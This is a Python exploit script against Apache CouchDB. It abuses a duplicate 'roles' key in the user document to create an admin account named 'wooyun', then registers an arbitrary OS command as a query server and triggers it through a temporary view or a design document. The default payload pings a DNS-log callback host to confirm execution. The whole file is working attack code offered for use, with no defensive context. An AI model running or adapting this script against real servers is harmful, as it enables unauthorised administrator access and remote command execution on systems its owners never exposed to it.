# coding=utf-8
#!/usr/bin/python
# Author: haya

import sys
import json
import requests
from urllib.request import Request, urlopen
from requests.auth import HTTPBasicAuth


def get_version(url):
    response = requests.get(url)
    db_version = json.loads(response.text)
    return int(db_version['version'][0:1])


def add_user(ip):
    url = r'/_users/org.couchdb.user:wooyun'
    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
        'Content-Type': 'application/json',
        }

    data = b"""
        {
          "type": "user",
          "name": "wooyun",
          "roles": ["_admin"],
          "roles":[],
          "password": "wooyun"
        }
        """
    full_url = ip + url
    try:
        res = Request(url=full_url, headers=headers, data=data, method='PUT')
        html = urlopen(res).read()
        # print(html)
        print("Maybe user add success!")
    except:
        print('Have a error!The user add failure!')
        print('Maybe the user is exist!')


def cme_exec(target, command, version):
    session = requests.session()
    session.headers = {
        'Content-Type': 'application/json'
    }
    session.put(target + '/_users/org.couchdb.user:wooyun', data='''{
      "type": "user",
      "name": "wooyun",
      "roles": ["_admin"],
      "roles": [],
      "password": "wooyun"
    }''')
    session.auth = HTTPBasicAuth('wooyun', 'wooyun')
    if version == 1:
        session.put(target + ('/_config/query_servers/cmd'), data=command)
    else:
        try:
            host = session.get(target + '/_membership').json()['all_nodes'][0]
            session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=command)
        except:
            print('The target faild')

    session.put(target + '/wooyun')
    session.put(target + '/wooyun/test', data='{"_id": "wooyuntest"}')

    if version == 1:
        session.post(target + '/wooyun/_temp_view?limit=10', data='{"language":"cmd","map":""}')
    else:
        session.put(target + '/wooyun/_design/test', data='{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}')


def main():
    target = sys.argv[1]
    command = '"ping dnslog"'
    version = get_version(target)
    add_user(target)
    cme_exec(target, command, version)

if __name__ == '__main__':
    main()
